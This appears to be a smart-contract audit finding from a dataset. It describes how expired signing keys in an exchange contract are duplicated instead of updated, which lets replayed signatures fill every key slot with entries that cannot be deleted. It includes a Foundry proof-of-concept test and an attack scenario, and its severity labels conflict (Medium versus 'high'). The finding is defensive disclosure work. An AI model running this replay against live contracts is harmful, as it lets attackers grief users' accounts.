# [M] Expired keys are not overwritten, and can lead

## Summary
Severity: Medium
Contest weight: 0.2476
Dataset id: 20339
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
Expired keys are not overwritten when the same key with a new expiry is registered. Instead, it creates a new mapping for the key and makes the old key unreachable and un-deletable, permanently using up a key slot.
The protocol uses the function _registerSigningKeyForAccount to register a key, after checking all the signatures (main account's signature and signing key's signature).
Exchange.sol#L589-L607
This function has an if-statement that determines if a new key should be added, or update an existing one.
#L594 The function isValidSigningKey just returns false if the key existing key has expired, causing the code to enter the else block, where a new entry is created instead of updating the old one. This explicitly goes against the documentation of this very branch since this does not update expired keys https://github.com/sherlo
Furthermore, if a user registers an old expired key again with a new expiry, expecting the code to behave according to the documentation, an entirely new problem is created. The function enters the else block as described above, and creates a new element in the accounts[account].signingKeys array https://github.c
It also overwrites the index mapping for this key, by setting the signingKeyIdxs mapping to the next index position. This means the older expired key is now completely de-referenced and in-fact cannot even be deleted.
Key deletions are handled in the function _revokeSigningKeyFromAccount where the signingKeyIdxs plays a vital role in finding the key to be deleted. https://github.com
Since the index mapping doesn't track the old key anymore, the old expired key will permanently use up a key slot.
This vulnerability can be combined with another issue reported as a medium: expired keys can be registered. The following attack can take place:
1. Alice registers key A, which expires after 3 days
2. After expiry, Bob replays alice's old transaction, which instead of updating, creates a NEW key entry with an already expired key.
3. Bob repeats this until all key slots are filled
4. Only the last slot (8) can be deleted. All other key slots are un-indexed and therefore un-deletable.
1. Expired keys are not updated, which goes against the documentation as shown
2. If expired keys are registered again, the old expired key is untracked and thus un-deletable
3. Griefing attacks can be performed using up all key slots if expired timestamps are allowed For all these issues, this is being classified as high.
The scenario can be recreated with the following POC The steps are:
1. Valid key is registered and time is warped until expiry.
2. Updating expiry creates a new entry increasing the keys array length. Time is warped again until expiry.
3. Old expired key can be added via replay attack, increasing array length again. can be increased to 8
uint256 expiryOld;
function test_ATTACKkey() public {
    // 1. Register valid key and warp
    expiresAt = block.timestamp + 10 days;
    expiryOld = expiresAt;
    SigUtils.RegisterSigningKey memory registerSigningKey = SigUtils.RegisterSigningKey({key: signingKey, expiresAt: expiresAt});
    bytes32 digest = sigUtils.getRegisterKeyTypedDataHash(registerSigningKey);
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(mainAccountPK, digest);
    bytes memory mainAccountSig = sigUtils.fromVRS(v, r, s);
    SigUtils.SignKey memory signKey = SigUtils.SignKey({account: mainAccount});
    bytes32 digest2 = sigUtils.getSignKeyTypedDataHash(signKey);
    (uint8 v2, bytes32 r2, bytes32 s2) = vm.sign(signingKeyPK, digest2);
    bytes memory signingKeySig = sigUtils.fromVRS(v2, r2, s2);
    syndrExchange.registerSigningKey(signingKey, expiresAt, signingKeySig, mainAccountSig);
    emit log("Regsitered key");
    vm.warp(expiresAt + 1);
    // 2. Update expiry of same key
    expiresAt = block.timestamp + 10 days;
    registerSigningKey = SigUtils.RegisterSigningKey({key: signingKey, expiresAt: expiresAt});
    digest = sigUtils.getRegisterKeyTypedDataHash(registerSigningKey);
    (v, r, s) = vm.sign(mainAccountPK, digest);
    bytes memory mainAccountSigNew = sigUtils.fromVRS(v, r, s);
    signKey = SigUtils.SignKey({account: mainAccount});
    digest2 = sigUtils.getSignKeyTypedDataHash(signKey);
    (v2, r2, s2) = vm.sign(signingKeyPK, digest2);
    bytes memory signingKeySigNew = sigUtils.fromVRS(v2, r2, s2);
    syndrExchange.registerSigningKey(signingKey, expiresAt, signingKeySigNew, mainAccountSigNew);
    vm.warp(expiresAt + 1);
    emit log("Re-registered key");
    AccountData.SigningKey[] memory signingKeys = syndrExchange.getSigningKeys(mainAccount);
    // Array increases!
    assertEq(signingKeys.length, 2);
    // 3. Replay old expired Key
    syndrExchange.registerSigningKey(signingKey, expiryOld, signingKeySig, mainAccountSig);
    signingKeys = syndrExchange.getSigningKeys(mainAccount);
    emit log("Re-played old key");
    assertEq(signingKeys.length, 3);
}

## Recommendation
1. Dis-allow expired keys
2. Instead of isValidSigningKey in the if statement, check for hasSigningKey. This does not check for expiry.
